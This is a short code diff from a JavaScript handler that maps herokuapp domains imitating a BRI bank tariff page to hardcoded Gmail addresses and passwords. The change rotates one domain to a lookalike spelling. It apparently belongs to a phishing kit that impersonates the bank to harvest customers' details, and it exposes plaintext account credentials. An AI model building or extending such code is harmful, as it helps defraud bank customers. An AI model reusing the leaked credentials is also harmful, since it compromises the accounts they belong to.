@@ -13,7 +13,7 @@ export default function handler(req, res) {
        pass = 'drlagxxrcdnjcgca'
     }else
     
-     if (url == 'pilihan-tarif-baru-bri.herokuapp.com'){
+     if (url == 'pilihan-tarif-baru-brii.herokuapp.com'){
 
        email = 'tofikhendri@gmail.com'
        pass = 'xjtmpcolkxwofzzo'
